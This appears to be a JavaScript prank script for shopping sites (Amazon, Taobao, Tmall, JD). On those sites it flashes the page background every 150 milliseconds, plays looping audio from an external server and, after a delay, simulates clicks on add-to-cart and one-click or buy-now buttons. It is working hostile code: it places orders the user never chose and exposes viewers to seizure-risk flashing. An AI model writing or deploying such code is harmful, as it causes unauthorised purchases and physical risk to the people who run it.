'use strict';

var host = location.hostname.split('.');
var site = host[host.length - 2];

switch(site) {
    case 'amazon': {
        sugar();
        setTimeout(function() {
            simulateClick('#add-to-cart-button');
            simulateClick('#one-click-button');
        }, 1e4);
    }
    case 'taobao': {
        sugar();
        setTimeout(function() {
            simulateClick('ul li[data-value]:first-child a');
            simulateClick('.J_LinkBuy');
        }, 5e3);
    }
    case 'tmall': {
        sugar();        
        setTimeout(function() {
            simulateClick('ul li[data-value]:first-child a');
            simulateClick('#J_LinkBuy');
        }, 5e3);
    }
    case 'jd': {
        sugar();
        setTimeout(function() {
            simulateClick('#InitCartUrl');            
        }, 5e3);        
    }
}

function sugar() {
  var colors = [
    'aliceblue',
    'antiquewhite',
    'aqua',
    'aquamarine',
    'azure',
    'beige',
    'bisque',
    'black',
    'blanchedalmond',
    'blue',
    'blueviolet',
    'brown',
    'burlywood',
    'cadetblue',
    'chartreuse',
    'chocolate',
    'coral',
    'cornflowerblue',
    'cornsilk',
    'crimson',
    'cyan',
    'darkblue',
    'darkcyan',
    'darkgoldenrod',
    'darkgray',
    'darkgreen',
    'darkgrey',
    'darkkhaki',
    'darkmagenta',
    'darkolivegreen',
    'darkorange',
    'darkorchid',
    'darkred',
    'darksalmon',
    'darkseagreen',
    'darkslateblue',
    'darkslategray',
    'darkslategrey',
    'darkturquoise',
    'darkviolet',
    'deeppink',
    'deepskyblue',
    'dimgray',
    'dimgrey',
    'dodgerblue',
    'firebrick',
    'floralwhite',
    'forestgreen',
    'fuchsia',
    'gainsboro',
    'ghostwhite',
    'gold',
    'goldenred',
    'gray',
    'green',
    'greenyellow',
    'grey',
    'honeydew',
    'hotpink',
    'indianred',
    'indigo',
    'ivory',
    'khaki',
    'lavender',
    'lavenderblush',
    'lawngreen',
    'lemonchiffon',
    'lightblue',
    'lightcoral',
    'lightcyan',
    'lightgoldenrodyellow',
    'lightgray',
    'lightgreen',
    'lightgrey',
    'lightpink',
    'lightsalmon',
    'lightseagreen',
    'lightskyblue',
    'lightslategray',
    'lightslategrey',
    'lightsteelblue',
    'lightyellow',
    'lime',
    'limegreen',
    'linen',
    'magenta',
    'maroon',
    'mediumaquamarine',
    'mediumblue',
    'mediumorchid',
    'mediumpurple',
    'mediumseagreen',
    'mediumslategreen',
    'mediumspringgreen',
    'mediumturquoise',
    'mediumvioletred',
    'midnightblue',
    'mintcream',
    'mistyrose',
    'moccasin',
    'navajowhite',
    'navy',
    'oldlace',
    'olive',
    'olivedrab',
    'orange',
    'orangered',
    'orchid',
    'palegoldenrod',
    'palegreen',
    'paleturquoise',
    'palevioletred',
    'papayawhip',
    'peachpuff',
    'peru',
    'pink',
    'plum',
    'powderblue',
    'purple',
    'rebeccapurple',
    'red',
    'rosybrown',
    'royalblue',
    'saddlebrown',
    'salmon',
    'sandybrown',
    'seagreen',
    'seashell',
    'sienna',
    'silver',
    'skyblue',
    'slateblue',
    'slategray',
    'slategrey',
    'snow',
    'springgreen',
    'steelblue',
    'tan',
    'teal',
    'thistle',
    'tomato',
    'transparent',
    'turquoise',
    'voilet',
    'wheat',
    'white',
    'whitesmoke',
    'yellow',
    'yellowgreen'
  ];
  
  setInterval(function() {
    var i = Math.floor(Math.random() * colors.length);
    document.body.style.backgroundColor = colors[i];
  }, 150);
  var audioElement = document.createElement('audio');
  audioElement.src = 'http://integ.b0.upaiyun.com/sugar.mp3';
  audioElement.loop = 'loop';
  audioElement.load();
  audioElement.play();
}

function simulateClick(btn) {
  var event = new MouseEvent('click', {
    'view': window,
    'bubbles': true,
    'cancelable': true
  });
  var cb = document.querySelectorAll(btn);
  if(cb.length) {
    Array.prototype.forEach.call(cb, function(item) {
      item.dispatchEvent(event);
    });
  }
}
